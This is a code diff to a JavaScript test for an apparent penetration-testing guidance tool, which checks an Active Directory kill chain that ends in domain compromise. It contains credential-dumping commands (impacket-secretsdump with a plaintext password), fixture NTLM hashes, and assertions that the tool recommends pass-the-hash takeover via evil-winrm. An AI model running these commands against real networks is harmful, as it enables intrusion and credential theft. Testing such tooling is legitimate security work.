@@ -80,12 +80,27 @@ s = step("bloodyAD -d corp.local --host 10.0.0.5 -u svc-web -p 'Password1' add d
 ok(s.has('ad.control_paths'), 'escalate: the DCSync grant is recorded as a control path');
 ok(s.ready['dcsync'], 'escalate → the DCSync move is reachable');
 
-// 10. secretsdump → NTDS + krbtgt = domain owned.
+// 10. secretsdump → NTDS + krbtgt = domain owned. (A real, non-blank Administrator hash so it becomes a
+// usable pass-the-hash credential — a blank 31d6… hash is a disabled account and must NOT be surfaced.)
 s = step("impacket-secretsdump 'corp.local/svc-web:Password1'@10.0.0.5", ['[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)',
   '[*] Using the DRSUAPI method to get NTDS.DIT secrets',
-  'Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::',
+  'corp.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::',
   'krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1a59bd44fa5f6f6f6f6f6f6f6f6f6f6f:::', '[*] Cleaning up...'].join('\n'));
 ok(s.has('loot.ntds') && s.has('hash.krbtgt'), 'LOOT: DCSync dumps NTDS + krbtgt — the domain is owned');
 
-console.log(fail ? ('\nAD KILL CHAIN E2E: ' + fail + ' FAILURES') : '\nAD KILL CHAIN E2E: all passed — recon → domain compromise, no dead ends');
+// 11. After the dump, the coach must LAND THE PLANE: the top ready move is "own the domain via pass-the-hash"
+// (not coercion, which is a mere route to the DCSync you already have), the Administrator hash is a usable
+// credential, and the coercion move has retired.
+ok(s.has('credential.available'), 'LOOT: the dumped Administrator hash is surfaced as a usable credential');
+var adminCred = facts.values('credential.available').filter(function (v) { return String(v.user).toLowerCase() === 'administrator' && v.nthash === '32693b11e6aa90eb43d32c72a07ceea6'; });
+ok(adminCred.length === 1, 'LOOT: the Administrator credential carries the dumped NT hash (ready to pass-the-hash)');
+var ready = OBOL.pack.nextActions(facts, pack, {});
+ok(ready.length && ready[0].id === 'own-domain-pth', 'LOOT → the #1 next move is "Own the Domain — Pass-the-Hash as Administrator" (id=' + (ready[0] && ready[0].id) + ')');
+ok(!ready.some(function (a) { return a.id === 'coerce-auth'; }), 'LOOT → the coercion move has retired (obsoleted by loot.ntds), no longer steering you sideways');
+// the endgame move's win command carries the ☠ cash-in and pass-the-hash form
+var endgame = pack.filter(function (a) { return a.id === 'own-domain-pth'; })[0];
+ok(endgame && (endgame.commands || []).some(function (c) { return c.win && /evil-winrm/.test(c.run); }), 'the endgame move flags a win (☠ Pwn This Target) command');
+ok(endgame && (endgame.commands || []).some(function (c) { return /-H \{\{nthash\}\}|:\{\{nthash\}\}/.test(c.run); }), 'the endgame commands pass the NT hash (fills from the surfaced Administrator credential)');
+
+console.log(fail ? ('\nAD KILL CHAIN E2E: ' + fail + ' FAILURES') : '\nAD KILL CHAIN E2E: all passed — recon → domain compromise → land the plane, no dead ends');
 process.exit(fail ? 1 : 0);
